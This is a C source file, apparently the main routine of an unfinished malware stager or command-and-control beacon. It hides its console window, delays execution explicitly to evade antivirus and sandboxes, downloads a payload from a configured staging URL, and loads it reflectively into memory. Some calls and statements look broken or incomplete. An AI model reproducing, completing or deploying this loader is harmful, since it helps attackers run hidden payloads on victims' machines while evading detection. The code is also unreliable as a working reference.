//
// Created by scrub on 10/9/2024.
//
//
// Created by scrub on 10/9/2024.
//

#include <stdio.h>
#include "Common/Common.h"
#include "../Beacond.h"
#include "../Core/Include/Crypto.h"
#include "../Core/Include/EvadeAV.h"
#include "../Lib/cJSON/cJSON.h"
#include "../Lib/DLLMemLdr/DllMemLdr.h"

#pragma comment(lib, "Wininet.lib")
#define MAX_DOMAIN_NAME_LENGTH 253

BEACON_INSTANCE myBeacon = { 0 };
PBEACON_INSTANCE Beacon = &myBeacon;


// TODO DO THIS (LAST)
BOOL Cleanup() { // Cleans up memory and handles
    return TRUE;
}


int main(void) {
    Beacon->Config.ChunkCount = 0;
    Beacon->Config.EncryptionMethod = 0;
    Beacon->Config.EncryptionKey[256];
    Beacon->Config.PayloadSize = 0;
    Beacon->Config.StagingURL = NULL;
    PVOID pPayloadBuffer = NULL;

    ParsePESection();

    /*
    printf("Payload Size %zd\n", Beacon->Config.PayloadSize);
    printf("Encryption Method %d\n", Beacon->Config.EncryptionMethod);
    printf("Encryption Key %s\n", Beacon->Config.EncryptionKey);
    printf("Staging URL %s\n", Beacon->Config.StagingURL);;
    */
    if (!LoadAPI()) {
        return FALSE;
    }
    // Hide the console window
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
    FreeConsole();

    // Evade Anti-Virus & Sandbox
    DelayProgramExecution(0.3);

    FetchPayload(&pPayloadBuffer);
    MemoryLoadLibrary(pPayloadBuffer, Beacon->Config.PayloadSize, Beacon->Config.isBeacon);

    // Create Event Loop
    HANDLE hEvent = CreateEvent(NULL, 0, 0, NULL);
    LARGE_INTEGER li;
    li.QuadPart = INFINITE;
    Beacon->Api.WaitForSingleObject(hEvent, 0, NULL);
    //printf("%lX", status);
}